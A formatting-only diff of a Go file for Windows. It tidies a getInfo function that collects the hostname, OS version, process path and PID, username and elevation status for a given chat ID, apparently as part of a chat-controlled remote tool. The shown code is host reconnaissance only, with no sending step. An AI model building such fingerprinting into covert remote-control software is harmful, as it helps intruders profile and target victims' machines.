@@ -1,18 +1,18 @@
 package main
 
 import (
-	"os"
-	"io"
 	"fmt"
-	"os/user"
+	"io"
 	"net/http"
+	"os"
+	"os/user"
+
 	"golang.org/x/sys/windows"
 )
 
-
 func getInfo(chatID int64) {
 	infoStr := ""
-	
+
 	// Hostname
 	hostname, err := os.Hostname()
 	if err == nil {
@@ -20,8 +20,8 @@ func getInfo(chatID int64) {
 	}
 
 	// OS version
-    maj, min, patch := windows.RtlGetNtVersionNumbers()
-    infoStr += fmt.Sprintf("OS Version: Windows %d.%d.%d\n",  maj, min, patch)
+	maj, min, patch := windows.RtlGetNtVersionNumbers()
+	infoStr += fmt.Sprintf("OS Version: Windows %d.%d.%d\n", maj, min, patch)
 
 	// Current process path + PID
 	exePath, err := os.Executable()
@@ -33,7 +33,7 @@ func getInfo(chatID int64) {
 	currentUser, err := user.Current()
 	if err == nil {
 		infoStr += "Username: " + currentUser.Username + "\n"
-	} 
+	}
 
 	// Is elevated
 	infoStr += fmt.Sprintf("Is elevated: %t\n", isAdmin())
